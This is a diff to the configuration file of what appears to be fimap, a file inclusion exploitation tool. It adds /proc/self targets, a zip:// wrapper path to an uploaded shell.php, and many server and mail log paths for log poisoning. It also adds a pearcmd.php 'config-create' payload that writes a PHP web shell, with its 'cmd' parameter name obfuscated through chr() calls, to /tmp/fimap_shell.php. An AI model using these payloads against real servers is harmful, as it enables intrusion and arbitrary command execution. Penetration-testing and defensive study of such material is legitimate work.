@@ -22,10 +22,52 @@ relative_files:
     flags: r
     unix: false
     windows: true
+  - path: /proc/self/fd/0
+    find: ""
+    flags: r
+    unix: true
+    windows: false
+  - path: /proc/self/fd/1
+    find: ""
+    flags: r
+    unix: true
+    windows: false
+  - path: /proc/self/fd/2
+    find: ""
+    flags: r
+    unix: true
+    windows: false
+  - path: /proc/self/status
+    find: "Name:"
+    flags: r
+    unix: true
+    windows: false
+  - path: /proc/self/cmdline
+    find: ""
+    flags: r
+    unix: true
+    windows: false
 
-absolute_files: []
+absolute_files:
+  - path: /usr/local/lib/php/pearcmd.php
+    post: "+config-create+/<?=system($_GET[chr(99).chr(109).chr(100)])?>+/tmp/fimap_shell.php"
+    find: ""
+    flags: rxP
+    unix: true
+    windows: false
+  - path: /usr/local/share/pear/pearcmd.php
+    post: "+config-create+/<?=system($_GET[chr(99).chr(109).chr(100)])?>+/tmp/fimap_shell.php"
+    find: ""
+    flags: rxP
+    unix: true
+    windows: false
 
-remote_files: []
+remote_files:
+  - path: "zip://path/to/uploaded.zip%23shell.php"
+    find: ""
+    flags: rR
+    unix: true
+    windows: true
 
 log_files:
   - path: /var/log/apache2/access.log
@@ -186,6 +228,71 @@ log_files:
   - path: /var/log/secure
     find: ' session '
     flags: LSx
+    unix: true
+    windows: false
+  - path: /var/log/apache2/error.log
+    find: 'PHP '
+    flags: Lx
+    unix: true
+    windows: false
+  - path: /var/log/apache/error.log
+    find: 'PHP '
+    flags: Lx
+    unix: true
+    windows: false
+  - path: /var/log/apache2/error_log
+    find: 'PHP '
+    flags: Lx
+    unix: true
+    windows: false
+  - path: /var/log/apache/error_log
+    find: 'PHP '
+    flags: Lx
+    unix: true
+    windows: false
+  - path: /var/log/httpd/error_log
+    find: 'PHP '
+    flags: Lx
+    unix: true
+    windows: false
+  - path: /var/log/httpd/error.log
+    find: 'PHP '
+    flags: Lx
+    unix: true
+    windows: false
+  - path: /usr/local/apache/logs/error_log
+    find: 'PHP '
+    flags: Lx
+    unix: true
+    windows: false
+  - path: /usr/local/apache2/logs/error_log
+    find: 'PHP '
+    flags: Lx
+    unix: true
+    windows: false
+  - path: /var/log/nginx/access.log
+    find: '"GET /'
+    flags: LHx
+    unix: true
+    windows: false
+  - path: /var/log/nginx/error.log
+    find: 'PHP '
+    flags: Lx
+    unix: true
+    windows: false
+  - path: /var/log/vsftpd.log
+    find: 'FAIL LOGIN'
+    flags: LFx
+    unix: true
+    windows: false
+  - path: /var/mail/www-data
+    find: 'From '
+    flags: LEx
+    unix: true
+    windows: false
+  - path: /var/spool/mail/www-data
+    find: 'From '
+    flags: LEx
     unix: true
     windows: false
 
